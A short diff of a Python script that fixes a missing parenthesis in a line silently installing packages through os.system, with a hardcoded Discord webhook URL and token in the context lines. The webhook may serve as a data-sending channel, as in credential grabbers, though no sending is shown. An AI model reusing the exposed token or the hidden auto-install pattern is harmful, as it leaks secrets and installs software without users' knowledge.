@@ -9,7 +9,7 @@ def osDetect():
 	installed = {pkg.key for pkg in pkg_resources.working_set}
 	missing = required - installed
 	if missing:
-		os.system("python3 -m pip install "+string(required)
+		os.system("python3 -m pip install "+string(required))
 	
 webHook = 'https://discordapp.com/api/webhooks/842058306364768327/-CDTIr60FGQOVdD-i1KBan6RTWA8nnITk79Jl72kPNhZi7Uv-jFXAxqA795FVhOrDa-5'
 def accept():
